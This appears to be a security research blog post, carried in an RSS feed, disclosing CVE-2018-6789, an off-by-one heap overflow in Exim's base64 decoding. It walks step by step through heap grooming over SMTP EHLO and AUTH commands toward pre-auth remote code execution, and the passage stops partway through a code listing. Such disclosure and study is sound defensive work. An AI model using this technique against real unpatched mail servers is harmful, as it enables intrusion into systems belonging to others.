                <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;We reported an overflow vulnerability in the base64 decode function of &lt;a href=&quot;https://www.exim.org/&quot;&gt;&lt;strong&gt;Exim&lt;/strong&gt;&lt;/a&gt; on 5 February, 2018, identified as &lt;a href=&quot;https://exim.org/static/doc/security/CVE-2018-6789.txt&quot;&gt;CVE-2018-6789&lt;/a&gt;. This bug exists since the first commit of exim, hence &lt;strong&gt;ALL versions&lt;/strong&gt; are affected. According to our research, it can be leveraged to gain &lt;strong&gt;Pre-auth Remote Code Execution&lt;/strong&gt; and at least 400k servers are at risk. Patched version 4.90.1 is already released and we suggest to upgrade exim immediately.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;All Exim versions below 4.90.1&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;one-byte-overflow-in-base64-decoding&quot;&gt;One byte overflow in base64 decoding&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;

&lt;p&gt;This is a calculation mistake of decode buffer length in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b64decode&lt;/code&gt; function:
&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/base64.c#L153&quot;&gt;base64.c: 153 b64decode&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ustrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// perform decoding&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As shown above, exim allocates a buffer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3*(len/4)+1&lt;/code&gt; bytes to store decoded base64 data. However, when the input is not a valid base64 string and the length is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4n+3&lt;/code&gt;, exim allocates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3n+1&lt;/code&gt; but consumes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3n+2&lt;/code&gt; bytes while decoding. This causes one byte heap overflow (aka off-by-one).
Generally, this bug is harmless because the memory overwritten is usually unused. However, this byte overwrites some critical data when the string fits some specific length. In addition, this byte is controllable, which makes exploitation more feasible.
Base64 decoding is such a fundamental function and therefore this bug can be triggered easily, causing remote code execution.
&lt;a id=&quot;back&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;To estimate the severity of this bug, we developed an exploit targeting SMTP daemon of exim. The exploitation mechanism used to achieve pre-auth remote code execution is described in the following paragraphs. In order to leverage this one byte overflow, it is necessary to trick memory management mechanism. It is highly recommended to have basic knowledge of heap exploitation &lt;a href=&quot;#heap_exp&quot;&gt;[ref]&lt;/a&gt; before reading this section.&lt;/p&gt;

&lt;p&gt;We developed the exploit with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Debian(stretch)&lt;/strong&gt; and &lt;strong&gt;Ubuntu(zesty)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SMTP daemon of Exim4 package&lt;/strong&gt; installed with apt-get (4.89/4.88)&lt;/li&gt;
  &lt;li&gt;Config enabled (uncommented in default config) &lt;strong&gt;CRAM-MD5 authenticator&lt;/strong&gt; (any other authenticator using base64 also works)&lt;/li&gt;
  &lt;li&gt;Basic SMTP commands (&lt;strong&gt;EHLO, MAIL FROM/RCPT TO&lt;/strong&gt;) and &lt;strong&gt;AUTH&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;memory-allocation&quot;&gt;Memory allocation&lt;/h4&gt;

&lt;p&gt;First, we review the source code and search for useful memory allocation. As we mentioned in the &lt;a href=&quot;&quot;&gt;previous article&lt;/a&gt;, exim uses self-defined functions for dynamic allocation:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_extend_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* The */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_free_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* value of the */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_get_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* 2nd arg is   */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_get_perm_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* __FILE__ in  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_malloc_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* every call,  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_release_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* so give its  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_reset_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* correct type */&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; of glibc directly. Glibc takes a slightly bigger (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes) &lt;strong&gt;chunk&lt;/strong&gt; and stores its metadata in the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes (x86-64) on every allocation, and then returns the location of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;. The following illustration describes structure of chunk:
&lt;img src=&quot;/assets/img/blog/20180306/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Metadata includes size of previous chunk (the one exactly above in memory), size of current block and some flags. The first three bits of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt; are used to store flags. In this example, size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x81&lt;/code&gt; implies current chunk is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80&lt;/code&gt; bytes and the previous chunk is in use.
Most of released chunks used in exim are put into a doubly linked list called &lt;strong&gt;unsorted bin&lt;/strong&gt;. Glibc maintains it according to the flags, and merges adjacent released chunks into a bigger chunk to avoid fragmentation. For every allocation request, glibc checks these chunks in an FIFO (first in, first-out) order and reuses the chunks.&lt;/p&gt;

&lt;p&gt;For some performance issues, exim maintains its own linked list structure with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt;.
&lt;img src=&quot;/assets/img/blog/20180306/2.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;
The main feature of storeblocks is that every block is at least &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2000&lt;/code&gt; bytes, which becomes a restriction to our exploitation. Note that a storeblock is also the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; of a chunk. Therefore, if we look into the memory, it is like:
&lt;img src=&quot;/assets/img/blog/20180306/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we list functions used to arrange heap data:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;EHLO hostname
  For each EHLO(or HELO) command, exim stores the pointer of hostname in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; old name&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; for new name&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L1833&quot;&gt;smtp_in.c: 1833 check_helo&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;1839&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Discard any previous helo name */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1840&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1841&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1842&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1843&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;store_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1844&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1845&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1884&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_copy_malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1885&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Unrecognized command
  For every unrecognized command with unprintable characters, exim allocates a buffer to convert it to printable
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; to store error message&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L5725&quot;&gt;smtp_in.c: 5725 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;5725&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;5726&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unrecognized command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;AUTH
  In most authentication procedure, exim uses base64 encoding to communicate with client. The encode and decode string are stored in a buffer allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; for strings&lt;/li&gt;
      &lt;li&gt;can contain unprintable characters, NULL bytes&lt;/li&gt;
      &lt;li&gt;not necessarily null terminated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Reset in EHLO/HELO, MAIL, RCPT
  When a command is done correctly, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is called. This function calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset block chain to a &lt;strong&gt;reset point&lt;/strong&gt;, which means all storeblocks allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; after last command are released.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset point (set at the beginning of function)&lt;/li&gt;
      &lt;li&gt;release blocks added at a time&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L3771&quot;&gt;smtp_in.c: 3771 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  3771 int
  3772 smtp_setup_msg(void)
  3773 {
  3774 int done = 0;
  3775 BOOL toomany = FALSE;
  3776 BOOL discarded = FALSE;
  3777 BOOL last_was_rej_mail = FALSE;
  3778 BOOL last_was_rcpt = FALSE;
  3779 void *reset_point = store_get(0);
  3780
  3781 DEBUG(D_receive) debug_printf(&quot;smtp_setup_msg entered\n&quot;);
  3782
  3783 /* Reset for start of new message. We allow one RSET not to be counted as a
  3784 nonmail command, for those MTAs that insist on sending it between every
  3785 message. Ditto for EHLO/HELO and for STARTTLS, to allow for going in and out of
  3786 TLS between messages (an Exim client may do this if it has messages queued up
  3787 for the host). Note: we do NOT reset AUTH at this point. */
  3788
  3789 smtp_reset(reset_point);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;exploit-steps&quot;&gt;Exploit steps&lt;/h4&gt;
&lt;p&gt;To leverage this off-by-one, the chunk beneath decoded base64 data should be freed easily and controllable. After several attempts, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; is a better choice. We arrange the heap layout to leave a freed chunk above &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; for the base64 data.
&lt;img src=&quot;/assets/img/blog/20180306/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Put a huge chunk into unsorted bin
 First of all, we send a EHLO message with huge hostname to make it allocate and deallocate, leaving a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6060&lt;/code&gt; length (3 storeblocks long) chunk in unsorted bin.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the first storeblock
 Then we send an unrecognized string to trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; and allocate a storeblock inside the freed chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the second storeblock and release the first one
 We send a EHLO message again to get the second storeblock. The first block is freed sequentially because of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; called after EHLO is done.&lt;/p&gt;

    &lt;p&gt;After the heap layout is prepared, we can use the off-by-one to overwrite the original chunk size. We modify &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2021&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20f1&lt;/code&gt;, which slightly extends the chunk.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Send base64 data and trigger off-by-one
 To trigger off-by-one, we start an AUTH command to send base64 data. The overflow byte precisely overwrites the first byte of next chunk and extends the next chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Forge a reasonable chunk size
 Because the chunk is extended, the start of next chunk of is changed to somewhere inside of the original one. Therefore, we need to make it &lt;strong&gt;seems like&lt;/strong&gt; a normal chunk to pass sanity checks in glibc. We send another base64 string here, because it requires &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; byte and unprintable character to forge chunk size.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Release the extended chunk
 To control the content of extended chunk, we need to release the chunk first because we cannot edit it directly. That is, we should send a new EHLO message to release the old host name. However, normal EHLO message calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; after it succeeds, which possibly makes program abort or crash. To avoid this, we send an &lt;strong&gt;invalid&lt;/strong&gt; host name such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a+&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt;&lt;/strong&gt; pointer of overlapped storeblock&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/6.png&quot; alt=&quot;&quot; /&gt;
 After the chunk is released, we can retrieve it with AUTH and overwrite part of overlapped storeblock. Here we use a trick called &lt;strong&gt;partial write&lt;/strong&gt;. With this, we can modify the pointer without breaking &lt;strong&gt;ASLR&lt;/strong&gt; (Address space layout randomization). We partially changed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; pointer to a storeblock containing ACL (Access Control List) strings. The ACL strings are pointed by a set of global pointers such as:&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_etrn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_expn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
